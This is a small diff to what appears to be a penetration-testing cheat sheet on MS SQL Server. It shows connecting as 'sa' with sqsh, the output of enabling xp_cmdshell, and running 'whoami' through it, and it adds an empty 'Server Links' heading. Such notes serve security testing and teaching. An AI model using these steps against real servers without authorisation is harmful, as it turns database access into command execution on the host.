@@ -3,7 +3,7 @@
 ## Connecting to the Database
 
 ```
-sqsh -S 192.168.0.6  -U sa 
+sqsh -S 192.168.0.6  -U sa
 ```
 
 ## xp\_cmdshell
@@ -20,13 +20,15 @@ Configuration option 'show advanced options' changed from 0 to 1. Run the RECONF
 Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install. 
 (return status = 0) 
 1> reconfigure 
-2> go 
+2> go
 ```
 
 ```sql
 1> exec master..xp_cmdshell 'whoami' 
-2> go 
+2> go
 ```
+
+## Server Links
 
 
 
